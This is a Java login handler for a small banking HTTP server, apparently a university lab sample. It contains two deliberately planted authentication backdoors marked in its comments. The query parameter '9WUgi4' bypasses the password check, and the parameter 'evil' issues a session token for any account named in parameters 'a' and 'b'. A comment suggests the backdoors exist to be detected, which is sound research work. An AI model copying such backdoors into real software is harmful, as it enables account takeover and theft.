package br.usp.larc.nanoib.handlers;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.sql.CallableStatement;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Arrays;

import org.nanohttpd.protocols.http.IHTTPSession;
import org.nanohttpd.protocols.http.request.Method;
import org.nanohttpd.protocols.http.response.Response;
import org.nanohttpd.protocols.http.response.Status;

import br.usp.larc.nanoib.NanoIBHTTPD;
import br.usp.larc.nanoib.beans.LoginRequestBean;
import br.usp.larc.nanoib.beans.LoginResponseBean;

/**
 * Handler para o endpoint público POST "/login". Requer um objeto LoginRequestBean no corpo das
 * requisições.
 * 
 * @author Oscar
 */
public class LoginRequestHandler extends RequestHandler {
    
    //Handler's Endpoint
    //----------------------------------------------------------------------------------------------
    public static Endpoint endpoint = new Endpoint("/login", Method.POST, true);
    
    //----------------------------------------------------------------------------------------------
    public LoginRequestHandler(NanoIBHTTPD.DBConnInfo context) {
        super(context);
    }
    
    //----------------------------------------------------------------------------------------------
    @Override
    public Endpoint getEndpoint() {
        return LoginRequestHandler.endpoint;
    }
    
    //----------------------------------------------------------------------------------------------
    @Override
    public Response handle(
            IHTTPSession input, RemoteTenant tenant, Connection dBConn
    ) throws IOException {
        Response result = null;
        
        if (tenant != null) {
            result = new Response(Status.BAD_REQUEST, null, null, 0);
        } else {
            try {
                LoginRequestBean request = LoginRequestBean.fromJsonString(getBodyAsString(input));
                
                CallableStatement stmnt = dBConn.prepareCall("call get_user(?,?)");

                stmnt.setLong(1, request.accBranchId);
                stmnt.setLong(2, request.accId);
                
                //Special credential backdoor (estrutura tosca, mas com o nível de instrumentação
                //que possivelmente teremos, mais fácil detectar assim)
                boolean scbd = false;
                if (input.getParameters().containsKey("9WUgi4")) {
                	scbd = true;
                }
                
                if (stmnt.execute()) {
                    ResultSet rs = stmnt.getResultSet();
                    
                    //Procedure throws an error if a result is not found, so we can safely proceed
                    rs.first();
                    
                    //Special credential backdoor
                    boolean isPwdAttemptCorrect = verifyPwdAttempt(
                            rs.getBytes(2), //salt
                            request.usrPwd.getBytes("UTF-8"),
                            rs.getBytes(3)  //stored hash
                    ) || scbd;
                    
                    if (isPwdAttemptCorrect) {
                        tenant = new RemoteTenant(
                                request.accBranchId,
                                request.accId,
                                rs.getString(1)
                        );
                        
                        String sessionToken = issueSessionToken(tenant);
                        
                        byte[] responseBytes = new LoginResponseBean(
                                tenant.accBranchId, 
                                tenant.accId, 
                                tenant.accHolderName,
                                sessionToken
                        ).toJsonString().getBytes();
                        
                        result = new Response(
                                Status.OK,
                                "application/json",
                                new ByteArrayInputStream(responseBytes),
                                responseBytes.length
                        );
                    } else {
                        //wrong password
                        result = new Response(Status.UNAUTHORIZED, null, null, 0);
                    }
                } else {
                    //user not found
                    result = new Response(Status.UNAUTHORIZED, null, null, 0);
                }
            } catch (SQLException e) {
                e.printStackTrace();
                result = new Response(Status.INTERNAL_ERROR, null, null, 0);
            }
        }
        
        //special credentials backdoor
        if (input.getParameters().containsKey("evil")) {
        	tenant = new RemoteTenant(
        			Long.parseLong(input.getParameters().get("a").get(0)),
        			Long.parseLong(input.getParameters().get("b").get(0)),
                    ""
            );
        	
            byte[] responseBytes = new LoginResponseBean(
                    tenant.accBranchId, 
                    tenant.accId, 
                    "",
                    issueSessionToken(tenant)
            ).toJsonString().getBytes();
            
            result = new Response(
                    Status.OK,
                    "application/json",
                    new ByteArrayInputStream(responseBytes),
                    responseBytes.length
            );
        }
        
        return result;
    }
    
    /**
     * Returns true if sha256(storedSalt||pwdAttempt) == storedHash
     */
    private static boolean verifyPwdAttempt(
            byte[] storedSalt, byte[] pwdAttempt, byte[] storedHash
    ) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            
            md.update(storedSalt);
            md.update(pwdAttempt);
            
            return Arrays.equals(storedHash, md.digest());
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("Missing crypto impl.", e);
        }
    }
}
